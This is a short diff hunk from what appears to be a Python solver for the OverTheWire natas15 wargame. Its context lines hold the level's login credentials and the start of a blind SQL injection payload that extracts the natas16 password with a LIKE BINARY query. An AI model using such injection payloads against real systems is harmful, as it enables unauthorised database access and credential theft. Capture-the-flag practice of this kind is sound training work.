@@ -46,7 +46,7 @@ def main():
 
 
 
-url = 'http://natas15.natas.labs.overthewire.org' 
+url = 'http://natas15.natas.labs.overthewire.org'
 url2 = 'http://maxjytyla.com/index.php'
 lvl_pass = requests.auth.HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
 un_base = 'natas16" AND password LIKE BINARY "'
